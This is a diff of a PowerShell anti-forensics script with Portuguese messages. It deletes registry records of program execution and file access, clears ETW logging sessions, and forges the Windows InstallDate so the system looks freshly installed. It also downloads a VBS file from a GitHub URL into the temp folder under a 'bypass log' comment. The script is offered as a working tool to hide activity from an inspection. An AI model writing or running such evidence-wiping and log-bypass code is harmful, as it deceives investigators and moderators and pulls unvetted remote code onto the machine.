@@ -40,7 +40,7 @@ $regKeys = @(
     "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched",
     "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePid1MRU",
     "HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\bam\State\UserSettings",
-	"HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache",
+    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache",
     "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU",
     "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Layers",
     "HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Persisted",
@@ -79,6 +79,8 @@ $regKeys = @(
     "HKEY_CURRENT_USER\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU",
     "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32\OpenSavePidlMRU\dll",
     "HKEY_CURRENT_USER\SOFTWARE\WinRAR\ArcHistory",
+    "HKEY_CURRENT_USER\SOFTWARE\AMD\HKIDs",
+    "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\RADAR\HeapLeakDetection\DiagnosedApplications",
     "HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FileExts\.dll",
     "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3936E9E4-D92C-4EEE-A85A-BC16D5EA0819}",
     "HKEY_LOCAL_MACHINE\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Explorer\HomeFolderDesktop\NameSpace\DelegateFolders\{3936E9E4-D92C-4EEE-A85A-BC16D5EA0819}",
@@ -525,6 +527,21 @@ try {
     Write-Host "[ERRO] Falha ao limpar sessões ETW: $_" -ForegroundColor Red
 }
 
+# Change Date Install ( Formating Sys )
+$regPath = "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion"
+$newInstallDate = 1742761079
+if (Test-Path $regPath) {
+    try {
+        Set-ItemProperty -Path $regPath -Name "InstallDate" -Value $newInstallDate -Type DWord
+        Write-Host "InstallDate alterado com sucesso para $newInstallDate (23/03/2025 21:17:59)"
+    } catch {
+        Write-Error "Erro ao alterar InstallDate: $_"
+    }
+} else {
+    Write-Error "Chave de Registro não encontrada: $regPath"
+}
+Clear-Host
+
 # Final completion message
 Clear-Host
 Write-Host "`n==================================" -ForegroundColor White
@@ -540,7 +557,6 @@ Write-Host "`Finalizado com sucesso!" -ForegroundColor White
 Write-Host "`n==================================" -ForegroundColor White
 
 # bypass log and Exit
-
 $vbsPath = "$env:TEMP\windows.vbs"
 $url = "https://github.com/castielwallker/whysistem/raw/refs/heads/main/microsoft.vbs"
 Invoke-WebRequest -Uri $url -OutFile $vbsPath -UseBasicParsing
